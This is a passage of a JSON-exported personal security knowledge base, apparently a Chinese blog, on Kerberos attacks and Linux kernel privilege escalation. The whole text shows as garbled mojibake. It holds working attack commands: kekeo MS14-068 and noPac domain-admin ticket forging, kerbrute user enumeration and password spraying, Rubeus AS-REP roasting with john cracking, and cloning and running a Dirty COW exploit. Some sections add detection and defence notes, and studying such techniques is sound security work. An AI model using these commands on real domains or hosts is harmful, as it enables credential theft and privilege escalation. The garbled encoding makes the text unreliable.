å¯†å…è®¸æ‰€æœ‰çš„åŠ å¯†ç®—æ³•ï¼Œåªè¦å®¢æˆ·ç«¯æŒ‡å®šä»»æ„ç­¾åç®—æ³•ï¼ŒKDCå°±ä¼šä½¿ç”¨è¿™ä¸ªæŒ‡å®šçš„ç®—æ³•éªŒè¯ç­¾åï¼Œè¿™é‡Œå°±å¯ä»¥æŒ‡å®šä½¿ç”¨ä¸éœ€è¦ç›¸å…³å¯†é’¥çš„ç®—æ³•æ¯”å¦‚md5ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è‡ªå·±ä¼ªé€ PACï¼Œå®ç°ä¼ªé€ è‡ªå·±ç”¨æˆ·çš„SIDå’Œæ‰€åœ¨çš„ç»„\né€šè¿‡ä¸Šé¢çš„æè¿°å¯ä»¥çŸ¥é“ï¼Œæˆ‘ä»¬å¯ä»¥ä¼ªé€ è‡ªå·±ä¸ºåŸŸç®¡ç†å‘˜ç»„çš„æˆå‘˜å®ç°åŸŸå†…ææƒ\næ—§ç‰ˆserveræ¯”å¦‚win2008 serverä¸Šåˆ©ç”¨kekeoå³å¯å®ç°åˆ©ç”¨ï¼š\nkekeo.exe \u0026#34;exploit::ms14068 /domain:yuy0ung.com /user:username /password:password /ptt\u0026#34; \u0026#34;exit\u0026#34; å½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨impacketä¸­çš„goldenPacç›´æ¥è·å–äº¤äº’å¼shell\nCVE-2021-42287ï¼ˆnopacï¼‰ æ¼æ´åˆ©ç”¨æµç¨‹ï¼š\nåˆ©ç”¨SAMRåè®®åˆ›å»ºæ— SPNçš„æœºå™¨è´¦æˆ·machine$ ä¿®æ”¹æœºå™¨è´¦æˆ·machine$çš„saMAccountNameå±æ€§ä¸ºDC01 ä»¥AD01çš„è´¦æˆ·è¯·æ±‚TGT å°†æœºå™¨è´¦æˆ·machine$çš„saMAccountNameå±æ€§è¿˜åŸä¸ºmachine$ åˆ©ç”¨S4U2selfåè®®ï¼Œä»¥åŸŸç®¡çš„èº«ä»½è¯·æ±‚DC01çš„æœåŠ¡ï¼Œè¯·æ±‚ä¸­å¸¦ä¸Šä¸Šä¸€æ­¥çš„TGTï¼Œæ­¤æ—¶KDCä¼šæŸ¥è¯¢DC01ï¼Œå‘ç°è´¦æˆ·ä¸å­˜åœ¨ï¼Œäºæ˜¯åˆæŸ¥è¯¢DC01$ï¼ŒæŸ¥è¯¢åˆ°æ˜¯åŸŸæ§ï¼Œäºæ˜¯å…è®¸åŸŸæ§å‘èµ·S4U2selfè¯·æ±‚è‡ªèº«çš„æœåŠ¡ï¼Œè¿”å›åŸŸç®¡ç†å‘˜æƒé™è®¿é—®DCæœåŠ¡çš„ST æ¥ä¸‹æ¥å°±å¯ä»¥ä½¿ç”¨é«˜æƒé™ç¥¨æ®æ‰§è¡Œé«˜æƒé™æ“ä½œäº† ä¸Šè¿°è¿‡ç¨‹å¯ä»¥ç›´æ¥ä½¿ç”¨å·¥å…·nopac.exeä¸€æ­¥åˆ°ä½ï¼š\nnoPac.exe -domain yuy0ung.com -user hack -pass Admin123456 /dc DC01.yuy0ung.com /mAccount machine /mpassword root /service cifs /ptt è¿è¡Œå®Œæˆå³å¯ç”Ÿæˆç¥¨æ®å¹¶å¯¼å…¥å†…å­˜\n",
        "summary": "kerberosæ”»å‡»ä¸“é¢˜ ç”±äºkerberosåè®®è®¤è¯çš„åŸºç¡€æµç¨‹å‰é¢æ–‡ç« å·²ç»è¯¦ç»†è§£é‡Šäº†ï¼Œè¿™é‡Œå°±ç›´æ¥è¿›å…¥æ”»å‡»é˜¶æ®µ\næ€»çš„æ¥çœ‹kerberoså¯ä»¥å½’ç»“äºä¸¤ä¸ªå­—ï¼šç¥¨æ®ï¼Œå‰é¢æåˆ°äº†å„é˜¶æ®µçš„å®‰å…¨é—®é¢˜ï¼š\nAS-REQé˜¶æ®µ åŸŸå†…ç”¨æˆ·åæšä¸¾ AS-REQä¸­çš„cnameè¡¨ç¤ºè¯·æ±‚çš„ç”¨æˆ·åï¼Œç”¨æˆ·åæ˜¯å¦å­˜åœ¨ä¼šå½±å“è¿”å›åŒ…çš„å†…å®¹ï¼Œå› æ­¤å¯ä»¥è¿›è¡ŒåŸŸå†…ç”¨æˆ·åæšä¸¾\næ–¹æ³• å¯ä»¥ä½¿ç”¨kerbruteè¿›è¡Œæšä¸¾ï¼š ä½¿ç”¨ç¼–è¯‘å¥½çš„å·¥å…·ï¼Œæˆ‘ä»¬èƒ½å¤Ÿåœ¨ä¸€å°ä¸åœ¨åŸŸå†…ï¼ˆå³åŸŸå¤–ï¼‰çš„æœºå™¨ä¸Šå’ŒDCè¿›è¡Œé€šä¿¡çš„æœºå™¨ä¸Šæšä¸¾åŸŸå†…ç”¨æˆ·ï¼š\nkerbrute_windows_amd64.exe userenum --dc 192.168.111.100 -d yuy0ung.com user.txt å½“ç„¶è¿˜æœ‰pythonè„šæœ¬https://github.com/3gstudent/pyKerbrute\nmsfä¸Šä¹Ÿæœ‰kerberos_enumusersæ¨¡å—\næ£€æµ‹ä¸é˜²å¾¡ æµé‡ï¼šæ£€æµ‹åŒä¸€IPçŸ­æ—¶é—´å†…æ˜¯å¦å‘é€äº†å¤§é‡çš„AS-REQåŒ… æ—¥å¿—ï¼šé»˜è®¤æƒ…å†µä¸‹ï¼Œå¯¹äºä¸å­˜åœ¨çš„ç”¨æˆ·åå‘èµ·çš„AS-REQåŒ…ä¸ä¼šæœ‰ä»»ä½•è®°å½•ï¼ˆè®°å½•éœ€è¦æ›´æ”¹ç»„ç­–ç•¥ï¼‰ï¼Œæ‰€ä»¥æ—¥å¿—å±‚é¢ä¸å¥½æ£€æµ‹ å¯†ç å–·æ´’ è€Œç”¨æˆ·åå­˜åœ¨æ—¶ï¼Œå¯†ç çš„æ­£ç¡®ä¸å¦ä¹Ÿä¼šå½±å“è¿”å›åŒ…ï¼Œè¿™é‡Œè™½ç„¶å¯ä»¥è¿›è¡Œå¯†ç çˆ†ç ´ï¼Œä½†è¿ç»­é’ˆå¯¹åŒä¸€è´¦æˆ·çš„å¯†ç çŒœæµ‹å¾ˆæœ‰å¯èƒ½ä¼šå¯¼è‡´è´¦æˆ·è¢«é”å®šï¼Œå› æ­¤æœ‰äº†å¯†ç å–·æ´’å–·æ´’æ”»å‡»ï¼šå³åœ¨çŒœè§£å¯†ç æ—¶ï¼Œä½¿ç”¨æ¯ä¸ªå¯†ç å»å°è¯•æ‰€æœ‰ç”¨æˆ·å\næ–¹æ³• è¯¥æ”»å‡»åŒæ ·å¯ä»¥åœ¨åŸŸå¤–è¿›è¡Œï¼Œä½†å¹¶ä¸æ”¯æŒkerberos\nå¯ä»¥ä½¿ç”¨kerbruteè¿›è¡Œå–·æ´’ï¼š\nkerbrute_windows_amd64.exe passwordspray --dc 192.168.111.100 -d yuy0ung.com user.txt Admin123456 å½“ç„¶ï¼Œå¦‚æœåŸŸæ²¡æœ‰å¯†ç é”å®šç­–ç•¥ï¼Œå¯ä»¥ç›´æ¥å¯¹å•ä¸ªç”¨æˆ·è¿›è¡Œçˆ†ç ´ï¼š\nkerbrute_windows_amd64.exe bruteuser --dc 192.168.111.100 -d yuy0ung.com user.txt pass.txt æ£€æµ‹ä¸é˜²å¾¡ æµé‡ï¼šæ£€æµ‹åŒä¸€IPçŸ­æ—¶é—´å†…æ˜¯å¦å‘é€äº†å¤§é‡çš„AS-REQåŒ… æ—¥å¿—ï¼šç™»å½•æˆåŠŸä¼šäº§ç”Ÿæ—¥å¿—4768ï¼Œä¸”ç»“æœä»£ç ä¸º0x0ï¼Œç™»å½•å¤±è´¥æ—¥å¿—ä¸åšè®°å½• AS-REPé˜¶æ®µ AS-REP Roasting å¯¹äºåŸŸç”¨æˆ·ï¼Œå¦‚æœè®¾ç½®äº†é€‰é¡¹â€ä¸è¦æ±‚kerberosåŸŸèº«ä»½éªŒè¯â€ï¼Œæ­¤æ—¶å‘åŸŸæ§åˆ¶å™¨çš„88ç«¯å£å‘é€AS_REQè¯·æ±‚ï¼Œå¯¹æ”¶åˆ°çš„AS_REPè¯·æ±‚enc-partçš„cipherè¿›è¡Œç»„åˆè§£å¯†å°±èƒ½è·å¾—ç”¨æˆ·çš„æ˜æ–‡ã€‚ï¼ˆenc-partåº•ä¸‹çš„cipherï¼Œè¿™éƒ¨åˆ†æ˜¯ä½¿ç”¨ç”¨æˆ·hashåŠ å¯†session-key)\næ–¹æ³• è·å–Hash\nå¯ä»¥ä½¿ç”¨Rbeusè‡ªåŠ¨æœç´¢æ»¡è¶³æ¡ä»¶çš„ç”¨æˆ·ï¼Œå¹¶è·å–login session keyï¼š\nRubeus.exe asreproast /format:john /outfile:hash.txt å†ä½¿ç”¨johnè¿›è¡Œç¦»çº¿ç ´è§£å³å¯ï¼š\njohn --wordlist=/opt/pass.txt hash.txt æ£€æµ‹ä¸é˜²å¾¡ æ£€æµ‹åŸŸä¸­æ˜¯å¦è®¾ç½®äº†â€œä¸è¦æ±‚kerberosåŸŸèº«ä»½éªŒè¯â€ï¼Œå¦‚æœå­˜åœ¨åŠæ—¶å…³é—­ æ—¥å¿—ï¼šé‡ç‚¹å…³æ³¨äº‹ä»¶IDä¸º4768ä¸”é¢„èº«ä»½éªŒè¯ç±»å‹ä¸ºâ€œä¸è¦æ±‚kerberosåŸŸèº«ä»½éªŒè¯â€å±æ€§ç”¨æˆ·å‘èµ·çš„Kerberosè®¤è¯ é»„é‡‘ç¥¨æ®æ”»å‡» åœ¨AS-REPé˜¶æ®µï¼Œè¿”å›çš„TGTçš„åŠ å¯†éƒ¨åˆ†æ˜¯ç”±krbtgtç”¨æˆ·çš„å¯†é’¥åŠ å¯†çš„ï¼Œå› æ­¤ï¼Œå¦‚æœæˆ‘ä»¬è·å¾—äº†krbtgtçš„å¯†é’¥ï¼Œæˆ‘ä»¬å°±å¯ä»¥è‡ªå·±åˆ¶ä½œä¸€ä¸ªTGTï¼Œè¯¥ç¥¨æ®è¢«ç§°ä¸ºé»„é‡‘ç¥¨æ®\n"
    }
,
    {
        "title": "Linuxå†…æ ¸ææƒ",
        "link": "/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/linux%E6%8F%90%E6%9D%83/linux%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83/",
        "content": "Linuxå†…æ ¸ææƒ é¡¾åæ€ä¹‰ï¼Œå³åˆ©ç”¨Linuxå†…æ ¸æ¼æ´è¿›è¡Œææƒï¼Œä¸€èˆ¬åŒ…å«ä¸‰ä¸ªç¯èŠ‚ï¼š\nå¯¹ç›®æ ‡ç³»ç»Ÿè¿›è¡Œä¿¡æ¯æ”¶é›†ï¼Œè·å–åˆ°ç³»ç»Ÿå†…æ ¸ä¿¡æ¯ä»¥åŠç‰ˆæœ¬ä¿¡æ¯ æ ¹æ®å†…æ ¸ç‰ˆæœ¬è·å–å…¶å¯¹åº”çš„æ¼æ´ä»¥åŠEXP ä½¿ç”¨æ‰¾åˆ°çš„EXPå¯¹ç›®æ ‡ç³»ç»Ÿå‘èµ·æ”»å‡»ï¼Œå®Œæˆææƒæ“ä½œ å†…æ ¸æº¢å‡º æ¼æ´çš„åŸç†æ›´åå‘äºpwnï¼ŒæŒ‡åœ¨æ“ä½œç³»ç»Ÿå†…æ ¸ç©ºé—´å‘ç”Ÿçš„ç¼“å†²åŒºæº¢å‡ºæ¼æ´ã€‚å³ç¨‹åºæ²¡æœ‰æ­£ç¡®éªŒè¯è¾“å…¥æ•°æ®çš„å¤§å°æ—¶ï¼Œå¤šå‡ºçš„æ•°æ®ä¼šè¦†ç›–ç›¸é‚»çš„å†…å­˜ï¼Œå¯¼è‡´å®‰å…¨é—®é¢˜\nä¿¡æ¯æ”¶é›† é¦–å…ˆéœ€è¦å¯¹Linuxå‘è¡Œç‰ˆæœ¬ã€å†…æ ¸ç‰ˆæœ¬è¿›è¡Œä¿¡æ¯æ”¶é›†ï¼Œè¿™é‡Œä»¥æˆ‘çš„CentOS 7ä¸ºä¾‹ï¼Œå±•ç¤ºä»¥ä¸‹å¸¸ç”¨å‘½ä»¤çš„è¾“å‡ºå†…å®¹ï¼š\nuname -a\t# æŸ¥çœ‹ç³»ç»Ÿå…¨éƒ¨ä¿¡æ¯ cat /etc/issue\t# æŸ¥çœ‹Linux ç³»ç»Ÿçš„ç‰ˆæœ¬ä¿¡æ¯ ä¸çŸ¥é“ä»€ä¹ˆåŸå› ï¼Œè¿™é‡Œæ–‡ä»¶ä¸­çš„å ä½ç¬¦æ²¡æœ‰è¢«è§£æï¼Œè¿™äº›å ä½ç¬¦çš„æ„æ€ï¼š\n\\Sï¼šè¿™è¡¨ç¤ºç³»ç»Ÿçš„åç§°ã€‚åœ¨è®¸å¤š Linux å‘è¡Œç‰ˆä¸­ï¼Œè¿™é€šå¸¸ä¼šè¢«æ›¿æ¢ä¸ºå…·ä½“çš„å‘è¡Œç‰ˆåç§°ï¼ˆä¾‹å¦‚ \u0026ldquo;Kali Linux\u0026rdquo;ï¼‰ã€‚\n\\rï¼šè¿™ä¸€éƒ¨åˆ†é€šå¸¸è¡¨ç¤ºç³»ç»Ÿçš„ç‰ˆæœ¬å·ï¼Œè¿™æ˜¯å†…æ ¸çš„ç‰ˆæœ¬ä¿¡æ¯ã€‚\n\\mï¼šè¿™è¡¨ç¤ºæœºå™¨çš„ç¡¬ä»¶æ¶æ„ã€‚ä¾‹å¦‚ï¼Œå®ƒå¯èƒ½ä¼šè¿”å› x86_64 è¡¨ç¤º 64 ä½ç³»ç»Ÿï¼Œæˆ– i686 è¡¨ç¤º 32 ä½ç³»ç»Ÿã€‚\ncat /etc/*-release\t# æŸ¥çœ‹Linux ç³»ç»Ÿçš„è¯¦ç»†ç‰ˆæœ¬ä¿¡æ¯ lsb_release -a\t# è·å–ç³»ç»Ÿçš„è¯¦ç»†ä¿¡æ¯ï¼Œä½†ç³»ç»Ÿä¸ä¸€å®šæœ‰lsb_release cat /proc/version\t# æŸ¥çœ‹ Linux å†…æ ¸çš„ç‰ˆæœ¬ä¿¡æ¯åŠç›¸å…³çš„ç¼–è¯‘ä¿¡æ¯ æŸ¥æ‰¾exp ä½¿ç”¨kaliè‡ªå¸¦çš„searchsploitå³å¯æŸ¥æ‰¾expï¼Œä¾‹å¦‚æŸ¥æ‰¾Ubantu 15.04çš„æ¼æ´ï¼š\nsearchsploit Ubantu 15.04 æŸ¥åˆ°åï¼Œæ¯”å¦‚expçš„pathä¸ºlinux/local/37088.cï¼š\næŸ¥çœ‹expï¼š\nsearchsploit -x linux/local/37088.c æœ‰å‡ ç‚¹éœ€è¦æ³¨æ„é˜…è¯»ï¼š\næºç æ³¨é‡Šï¼šäº†è§£æºç ç¼–è¯‘æ–¹å¼ æºç å†…å®¹ï¼šäº†è§£å·¥ä½œæµç¨‹ä¾¿äºä¼˜åŒ–ä¸ä¿®æ”¹ï¼Œä¸”é¿å…å­˜åœ¨æ¶æ„åé—¨ å¤åˆ¶expåˆ°å½“å‰ç›®å½•ï¼š\nsearchsploit -m linux/local/37088.c ä½¿ç”¨exp é€šå¸¸ä½¿ç”¨wgetç­‰åŠæ³•å°†expä¼ åˆ°å—å®³ä¸»æœºä¸Šï¼Œå¹¶æŒ‰ç…§expä½¿ç”¨æ–¹æ³•è¿›è¡Œææƒï¼ˆå€ŸåŠ©æœç´ å¼•æ“æŸ¥é˜…ä½¿ç”¨æ–¹æ³•ï¼‰ï¼Œé€šå¸¸æ¥è¯´ï¼š\nå¦‚æœæ˜¯shè„šæœ¬æ–‡ä»¶ï¼Œèµ‹äºˆæƒé™æ‰§è¡Œå³å¯ å¦‚æœæ˜¯cæ–‡ä»¶ï¼Œé€šå¸¸æ˜¯éœ€è¦gccç¼–è¯‘ï¼Œå†ç»™ç¼–è¯‘åçš„æ–‡ä»¶èµ‹äºˆæƒé™ï¼Œæœ€åæ‰§è¡Œ CVE-2016-5195ï¼ˆDirty Cowè„ç‰›ï¼‰ è„ç‰›ææƒçš„åˆ©ç”¨æ–¹å¼ä¸åŒäºå…¶ä»–çš„å†…æ ¸æº¢å‡ºææƒï¼Œè¿™é‡Œå•ç‹¬è®°å½•\nè„ç‰›æ˜¯ä¸€ä¸ªéå¸¸ç»å…¸çš„å†…æ ¸ææƒæ¼æ´ï¼Œå­˜åœ¨Linuxå†…æ ¸ä¸­å·²ç»æœ‰é•¿è¾¾9å¹´çš„æ—¶é—´ï¼Œåœ¨2007å¹´å‘å¸ƒçš„Linuxå†…æ ¸ç‰ˆæœ¬ä¸­å°±å·²ç»å­˜åœ¨æ­¤æ¼æ´ï¼Œåœ¨2016å¹´10æœˆ18åæ‰å¾—ä»¥ä¿®å¤\n**å½±å“èŒƒå›´ï¼š**Linux kernel\u0026gt;2.6.22 (released in 2007)çš„æ‰€æœ‰Linuxç³»ç»Ÿï¼Œä¸”ä½äºä»¥ä¸‹ç‰ˆæœ¬ï¼š\nCentos7/RHEL7 3.10.0-327.36.3.el7 Cetnos6/RHEL6 2.6.32-642.6.2.el6 Ubuntu 16.10 4.8.0-26.28 Ubuntu 16.04 4.4.0-45.66 Ubuntu 14.04 3.13.0-100.147 Debian 8 3.16.36-1+deb8u2 Debian 7 3.2.82-1 æ¼æ´æˆå›  linuxå†…æ ¸çš„å†…å­˜å­ç³»ç»Ÿåœ¨å¤„ç†ç§æœ‰æ˜ å°„æ—¶çš„å†™æ—¶å¤åˆ¶ï¼ˆcopy on writeï¼ŒCOWï¼‰çš„ä¸­æ–­æ–¹å¼é‡Œåˆ›å»ºäº†æ¡ä»¶ç«äº‰ï¼Œè¯¥æ¡ä»¶ç«äº‰å¯èƒ½è¿è¡Œéç‰¹æƒç”¨æˆ·è·å¾—å¯¹åªè¯»å†…å­˜æ˜ å°„çš„å†™å…¥æƒé™\nå†™æ—¶å¤åˆ¶æ˜¯ä¸€ç§å†…å­˜ç®¡ç†çš„ä¼˜åŒ–æŠ€æœ¯ï¼Œç”¨äºåœ¨å¤šä¸ªè¿›ç¨‹å…±äº«åŒä¸€ä¸ªå†…å­˜é¡µçš„æƒ…å†µä¸‹é¿å…å†…å­˜å†²çªã€‚å½“ä¸€ä¸ªè¿›ç¨‹è¯•å›¾ä¿®æ”¹ä¸€ä¸ªå†…å­˜é¡µæ—¶ï¼Œæ“ä½œç³»ç»Ÿä¼šè‡ªåŠ¨å¤åˆ¶è¿™ä¸ªå†…å­˜é¡µï¼Œè€Œä¸ä¼šå—åˆ°å½“å‰è¿›ç¨‹ä¿®æ”¹çš„å½±å“\nåˆ©ç”¨æ–¹å¼ é»˜è®¤æƒ…å†µä¸‹ï¼Œä½æƒé™ä¼šè¯æ˜¯æ— æ³•ä¿®æ”¹é«˜æƒé™æ–‡ä»¶ï¼Œæ¯”å¦‚ /etc/passwdã€/etc/shadowã€/etc/group ç­‰ã€‚è„ç‰›æ¼æ´çš„åˆ©ç”¨æ–¹å¼æ˜¯ï¼šé¦–å…ˆä½¿ç”¨ mmap å‡½æ•°ç”³è¯·è™šæ‹Ÿå†…å­˜ï¼Œåœ¨è™šæ‹Ÿå†…å­˜ä¸Šæ‰¾åˆ°ä¸€ä¸ªé¡µé¢åˆ›å»ºç§æœ‰æ˜ å°„ï¼ˆä»¥ /etc/group ä¸ºä¾‹ï¼‰ã€‚ç”±äºæ­¤æ˜ å°„æ˜¯ç§æœ‰çš„ï¼Œå› æ­¤å¯ä»¥éšæ„å¯¹æ–‡ä»¶å†™å…¥ä¿®æ”¹è€Œä¸ä¼šå½±å“åŸæ–‡ä»¶ï¼Œç„¶åå‘ç§æœ‰æ˜ å°„æ–‡ä»¶ä¸­å†™å…¥å†…å®¹ï¼Œå°†å½“å‰ç”¨æˆ·æ·»åŠ è‡³ sudo ç»„ï¼Œä½†ä¸æ˜¯ç›´æ¥å‘ mmap ç”³è¯·çš„è™šæ‹Ÿæ˜ å°„ä¸­å†™å…¥å†…å®¹ï¼Œè€Œæ˜¯å‘ Linux ä¸­çš„ä¸€ä¸ªç‰¹æ®Šæ–‡ä»¶ /proc/self/mem ä¸­å†™å…¥ã€‚\nmmap å‡½æ•°æ˜¯ç”¨æ¥åˆ›å»ºå†…å­˜æ˜ å°„çš„å‡½æ•°ã€‚é€šè¿‡å†…å­˜æ˜ å°„ï¼Œå¯ä»¥å°†ä¸€æ®µæ–‡ä»¶æˆ–å…¶ä»–å¯¹è±¡æ˜ å°„åˆ°è¿›ç¨‹çš„åœ°å€ç©ºé—´ï¼Œä»è€Œå¯ä»¥ç›´æ¥è®¿é—®è¯¥å¯¹è±¡ã€‚ /proc/self/mem æ–‡ä»¶æ˜¯ Linux çš„ä¸€ä¸ªç‰¹æ®Šæ–‡ä»¶ï¼Œå®ƒå…è®¸ç¨‹åºç›´æ¥è®¿é—®å½“å‰è¿›ç¨‹çš„è™šæ‹Ÿå†…å­˜ç©ºé—´ã€‚é€šè¿‡è¯»å†™ /proc/self/mem æ–‡ä»¶ï¼Œå¯ä»¥ç›´æ¥åœ¨è™šæ‹Ÿå†…å­˜ä¸­ä¿®æ”¹æŒ‡å®šå†…å­˜ä½ç½®çš„æ•°æ®ã€‚ å†™å…¥ /proc/self/mem å®Œæˆåï¼Œå†…æ ¸éœ€è¦åœ¨ç‰©ç†å†…å­˜ä¸Šå¯»æ‰¾å†™å…¥çš„ä½ç½®ï¼Œæ­¤æ—¶è¿˜æœªå¼€å§‹å†™å…¥ã€‚å¹¶è¡Œè¿è¡Œä¸¤ä¸ªçº¿ç¨‹ï¼Œç¬¬ä¸€ä¸ªçº¿ç¨‹çš„åŠŸèƒ½æ˜¯å†™å…¥ç‰©ç†å†…å­˜ï¼Œå®ƒåŒ…æ‹¬ä¸¤ä¸ªæ“ä½œï¼Œåˆ†åˆ«æ˜¯å®šä½åˆ°ç‰©ç†å†…å­˜å’Œå†™å…¥ç‰©ç†å†…å­˜ã€‚åœ¨å®šä½ç‰©ç†å†…å­˜ä½ç½®æ—¶ï¼Œå†…æ ¸å‘ç°ç‰©ç†å†…å­˜ä¸­å·²ç»æœ‰äº†ä¸€ä¸ª /etc/group æ–‡ä»¶ï¼Œè¿™æ—¶è§¦å‘å†™æ—¶å¤åˆ¶ï¼Œå†…æ ¸å‡†å¤‡åœ¨ç‰©ç†å†…å­˜ä¸­æ‰¾åˆ°ä½ç½®åˆ›å»ºç§æœ‰æ˜ å°„çš„å‰¯æœ¬ï¼Œç„¶åå†™å…¥ã€‚åœ¨å†™å…¥ä¹‹å‰ï¼Œè¿è¡Œç¬¬äºŒä¸ªçº¿ç¨‹ï¼Œå…¶åŠŸèƒ½æ˜¯è°ƒç”¨ madvise å‡½æ•°ï¼Œé€šçŸ¥å†…æ ¸ä¸å†éœ€è¦ï¼ˆMADV_DONTNEEDï¼‰ç§æœ‰æ˜ å°„ã€‚è¿™æ ·ï¼Œå†…æ ¸å°±æœ‰å¯èƒ½ä¼šè¢«æ¬ºéª—ï¼Œè®¤ä¸ºç¨‹åºå†™å…¥çš„æ˜¯åŸå§‹æ–‡ä»¶ã€‚é€šè¿‡æ— é™å¾ªç¯è¿™ä¸¤ä¸ªçº¿ç¨‹ï¼Œå°±æœ‰å¯èƒ½å®Œæˆç«äº‰æ¡ä»¶ï¼ŒæˆåŠŸåœ°å†™å…¥åŸå§‹æ–‡ä»¶\næ¼æ´å½±å“ å…è®¸åœ¨æ²¡æœ‰è¶³å¤Ÿæƒé™çš„æƒ…å†µä¸‹ä¿®æ”¹åªè¯»æ–‡ä»¶æ¯”å¦‚/etc/passwdï¼Œå¯¼è‡´æƒé™æå‡\næ¼æ´å¤ç° ä¸»æœºç‰ˆæœ¬ï¼š\næ»¡è¶³æ¡ä»¶ï¼Œå¼€å§‹æ¼æ´åˆ©ç”¨ï¼Œè¿™é‡Œç›´æ¥ä½¿ç”¨githubä¸Šçš„expï¼šgbonacini/CVE-2016-5195: A CVE-2016-5195 exploit example. (github.com)\n# é¦–å…ˆä¸‹è½½expï¼Œç”±äºè£…äº†gitï¼Œè¿™é‡Œå°±ç›´æ¥cloneäº† git clone https://github.com/gbonacini/CVE-2016-5195.git # è¿›å…¥ç›®å½•makeç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ make # æ‰§è¡Œmakeå¥½çš„æ–‡ä»¶ï¼Œå³å¯è‡ªåŠ¨å®Œæˆåˆ©ç”¨å¹¶ææƒ ./dcow -s æ³¨ï¼šä¸»æœºä¸Šéœ€è¦æœ‰gccï¼Œä¸”æ‰§è¡Œmakeåçš„ gcc ç‰ˆæœ¬è¦è¾ƒé«˜ç‰ˆæœ¬\nå½“ç„¶è¿˜æœ‰å…¶ä»–ç‰ˆæœ¬æ¯”å¦‚ï¼šhttps://github.com/FireFart/dirtycow\nMetasploit å› ä¸ºmsfæ˜¯ä¸€ä¸ªå¸¸ç”¨çš„åæ¸—é€æ¨¡å—ï¼Œè¿™é‡Œå†è®°å½•ä¸€ä¸‹ä½¿ç”¨å…¶ä¸­local_exploit_suggesteræ¨¡å—çš„äº‹é¡¹ï¼š\nè¯¥æ¨¡å—ä¼šæ£€æµ‹ç³»ç»Ÿæ˜¯å¦å­˜åœ¨æ¼æ´å¹¶æ ¹æ®æ¼æ´ï¼Œå›æ˜¾åˆ©ç”¨æ¨¡å—è·¯å¾„\nä¾ç„¶ä»¥ä¸Šé¢çš„ubuntuä¸ºä¾‹ï¼š\né¦–å…ˆgetshellï¼ˆæˆ‘è¿™é‡Œç›´æ¥ç”¨msfvenomç”Ÿæˆçš„é©¬å­ä¸Šçº¿ï¼‰\nbgæŒ‚èµ·ä¼šè¯ï¼Œå†useä¸€ä¸‹post/multi/recon/local_exploit_suggesteræ¨¡å—ï¼Œè®¾ç½®ä¸€ä¸‹shellçš„sessionï¼Œå³å¯è‡ªåŠ¨æ£€æŸ¥ï¼š\nå‘ç°æœ‰å¾ˆå¤šå¯èƒ½çš„æ¼æ´ï¼Œç›´æ¥useå¡«å¥½å‚æ•°å³å¯åˆ©ç”¨\nå¦‚ä½•é˜²å¾¡ï¼Ÿ æ„Ÿè§‰æ²¡å•¥å¯è¯´çš„ï¼Œæ— éå°±ä»¥ä¸‹è¿™äº›ï¼š\nå®šæœŸæ£€æŸ¥æ˜¯å¦æœ‰å¯ç”¨çš„æ›´æ–°æˆ–è¡¥ä¸ ä½¿ç”¨é˜²ç«å¢™é˜»æ­¢æ”»å‡»è€…å°è¯•åˆ©ç”¨å†…æ ¸æ¼æ´è¿›è¡Œæ”»å‡»çš„ç½‘ç»œè¿æ¥ ä½¿ç”¨å®‰å…¨è½¯ä»¶æ¥æ£€æµ‹å’Œé˜»æ­¢æ¶æ„è½¯ä»¶çš„è¿è¡Œ ",
        "summary": "Linuxå†…æ ¸ææƒ é¡¾åæ€ä¹‰ï¼Œå³åˆ©ç”¨Linuxå†…æ ¸æ¼æ´è¿›è¡Œææƒï¼Œä¸€èˆ¬åŒ…å«ä¸‰ä¸ªç¯èŠ‚ï¼š\nå¯¹ç›®æ ‡ç³»ç»Ÿè¿›è¡Œä¿¡æ¯æ”¶é›†ï¼Œè·å–åˆ°ç³»ç»Ÿå†…æ ¸ä¿¡æ¯ä»¥åŠç‰ˆæœ¬ä¿¡æ¯ æ ¹æ®å†…æ ¸ç‰ˆæœ¬è·å–å…¶å¯¹åº”çš„æ¼æ´ä»¥åŠEXP ä½¿ç”¨æ‰¾åˆ°çš„EXPå¯¹ç›®æ ‡ç³»ç»Ÿå‘èµ·æ”»å‡»ï¼Œå®Œæˆææƒæ“ä½œ å†…æ ¸æº¢å‡º æ¼æ´çš„åŸç†æ›´åå‘äºpwnï¼ŒæŒ‡åœ¨æ“ä½œç³»ç»Ÿå†…æ ¸ç©ºé—´å‘ç”Ÿçš„ç¼“å†²åŒºæº¢å‡ºæ¼æ´ã€‚å³ç¨‹åºæ²¡æœ‰æ­£ç¡®éªŒè¯è¾“å…¥æ•°æ®çš„å¤§å°æ—¶ï¼Œå¤šå‡ºçš„æ•°æ®ä¼šè¦†ç›–ç›¸é‚»çš„å†…å­˜ï¼Œå¯¼è‡´å®‰å…¨é—®é¢˜\nä¿¡æ¯æ”¶é›† é¦–å…ˆéœ€è¦å¯¹Linuxå‘è¡Œç‰ˆæœ¬ã€å†…æ ¸ç‰ˆæœ¬è¿›è¡Œä¿¡æ¯æ”¶é›†ï¼Œè¿™é‡Œä»¥æˆ‘çš„CentOS 7ä¸ºä¾‹ï¼Œå±•ç¤ºä»¥ä¸‹å¸¸ç”¨å‘½ä»¤çš„è¾“å‡ºå†…å®¹ï¼š\nuname -a\t# æŸ¥çœ‹ç³»ç»Ÿå…¨éƒ¨ä¿¡æ¯ cat /etc/issue\t# æŸ¥çœ‹Linux ç³»ç»Ÿçš„ç‰ˆæœ¬ä¿¡æ¯ ä¸çŸ¥é“ä»€ä¹ˆåŸå› ï¼Œè¿™é‡Œæ–‡ä»¶ä¸­çš„å ä½ç¬¦æ²¡æœ‰è¢«è§£æï¼Œè¿™äº›å ä½ç¬¦çš„æ„æ€ï¼š\n\\Sï¼šè¿™è¡¨ç¤ºç³»ç»Ÿçš„åç§°ã€‚åœ¨è®¸å¤š Linux å‘è¡Œç‰ˆä¸­ï¼Œè¿™é€šå¸¸ä¼šè¢«æ›¿æ¢ä¸ºå…·ä½“çš„å‘è¡Œç‰ˆåç§°ï¼ˆä¾‹å¦‚ \u0026ldquo;Kali Linux\u0026rdquo;ï¼‰ã€‚\n\\rï¼šè¿™ä¸€éƒ¨åˆ†é€šå¸¸è¡¨ç¤ºç³»ç»Ÿçš„ç‰ˆæœ¬å·ï¼Œè¿™æ˜¯å†…æ 